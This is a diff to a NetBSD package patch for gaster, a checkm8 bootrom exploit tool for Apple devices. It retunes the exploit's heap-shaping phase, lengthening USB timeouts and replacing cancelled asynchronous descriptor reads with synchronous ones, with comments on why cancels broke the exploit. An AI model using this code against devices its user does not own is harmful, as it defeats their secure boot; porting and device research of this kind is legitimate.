@@ -1,6 +1,6 @@
 $NetBSD$
 diff --git gaster.c gaster.c
-index b52b08d..80de51e 100644
+index b52b08d..f8b9e1e 100644
 --- gaster.c
 +++ gaster.c
 @@ -1,4 +1,5 @@
@@ -679,7 +679,7 @@ index b52b08d..80de51e 100644
  				}
  			}
  			free(data);
-@@ -1228,20 +1744,184 @@ checkm8_stage_patch(const usb_handle_t *handle) {
+@@ -1228,20 +1744,190 @@ checkm8_stage_patch(const usb_handle_t *handle) {
  	return ret;
  }
  
@@ -735,7 +735,9 @@ index b52b08d..80de51e 100644
 +	}
 +
 +	puts("pwn2 phase 1: heap shaping with descriptor reads");
-+	t = 10;
++	/* Generous per-request budget: a mid-flight timeout would cancel
++	 * a transfer the same way the 1 ms host-side abort did. */
++	t = 100;
 +#ifdef GASTER_NETBSD_NATIVE
 +	(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t);
 +#endif
@@ -761,25 +763,29 @@ index b52b08d..80de51e 100644
 +#endif
 +	}
 +	for(i = 0; i < config_large_leak; ++i) {
-+		/* The reference drives these reads with a 1 ms timeout; the
-+		 * kernel request timeout rounds up to a 10 ms tick, so use
-+		 * the thread abort instead to keep the reference pace. */
++		/* The reference relies on natural completion; its 1 ms
++		 * timeout is only insurance.  A fixed host-side cancel at
++		 * 1 ms lands mid-transfer as soon as the growing heap
++		 * slows the ROM down, and that cancel kills the responsive
++		 * state (probe battery 2026-10-23: without cancels every
++		 * read completes).  Run the leaks synchronously with the
++		 * generous phase timeout instead. */
 +		transfer_ret_t leak_ret;
 +
-+		send_usb_control_request_async_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, 1, &leak_ret);
++		send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, &leak_ret);
 +		if((i & 0x3FF) == 0) {
 +			struct timespec now;
 +			clock_gettime(CLOCK_MONOTONIC, &now);
 +			fprintf(stderr, "[pwn2] leak %zu/%zu ret=%d errno=%d t=%lld.%03ld\n",
-+			    i, config_large_leak, (int)leak_ret.ret, gaster_dbg_async_errno,
++			    i, config_large_leak, (int)leak_ret.ret, gaster_dbg_sync_errno,
 +			    (long long)(now.tv_sec), now.tv_nsec / 1000000);
 +		}
 +	}
 +	{
 +		transfer_ret_t tail;
 +
-+		send_usb_control_request_async_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x41, 1, &tail);
-+		fprintf(stderr, "[pwn2] no_leak: ret=%d errno=%d\n", (int)tail.ret, gaster_dbg_async_errno);
++		send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x41, &tail);
++		fprintf(stderr, "[pwn2] no_leak: ret=%d errno=%d\n", (int)tail.ret, gaster_dbg_sync_errno);
 +	}
 +	fprintf(stderr, "[pwn2] phase 1 done, resetting\n");
 +	reset_usb_handle(handle);
@@ -871,7 +877,7 @@ index b52b08d..80de51e 100644
  			if(stage == STAGE_RESET) {
  				puts("Stage: RESET");
  				ret = checkm8_stage_reset(handle);
-@@ -1265,7 +1945,7 @@ gaster_checkm8(usb_handle_t *handle) {
+@@ -1265,7 +1951,7 @@ gaster_checkm8(usb_handle_t *handle) {
  				puts("ret: false");
  				stage = STAGE_RESET;
  			}
@@ -880,7 +886,7 @@ index b52b08d..80de51e 100644
  		} else {
  			stage = STAGE_PWNED;
  			puts("Now you can boot untrusted images.");
-@@ -1412,7 +2092,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
+@@ -1412,7 +2098,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
  
  static bool
  aes_256_cbc_decrypt(const uint8_t *key, const uint8_t *iv, const uint8_t *data_src, uint8_t *data_dst, size_t data_sz) {
@@ -889,7 +895,7 @@ index b52b08d..80de51e 100644
  	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  	bool ret = false;
  	int out_sz;
-@@ -1628,10 +2308,20 @@ main(int argc, char **argv) {
+@@ -1628,10 +2314,20 @@ main(int argc, char **argv) {
  	int ret = EXIT_FAILURE;
  	usb_handle_t handle;
  
@@ -910,7 +916,7 @@ index b52b08d..80de51e 100644
  	if(env_usb_abort_timeout_min == NULL || sscanf(env_usb_abort_timeout_min, "%u", &usb_abort_timeout_min) != 1 || usb_abort_timeout_min > usb_timeout) {
  		usb_abort_timeout_min = 0;
  	}
-@@ -1640,6 +2330,10 @@ main(int argc, char **argv) {
+@@ -1640,6 +2336,10 @@ main(int argc, char **argv) {
  		if(gaster_reset(&handle)) {
  			ret = 0;
  		}
@@ -921,7 +927,7 @@ index b52b08d..80de51e 100644
  	} else if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
  		if(gaster_checkm8(&handle)) {
  			ret = 0;
-@@ -1657,6 +2351,10 @@ main(int argc, char **argv) {
+@@ -1657,6 +2357,10 @@ main(int argc, char **argv) {
  		puts("env:");
  		puts("USB_TIMEOUT - USB timeout in ms");
  		puts("USB_ABORT_TIMEOUT_MIN - USB abort timeout minimum in ms");
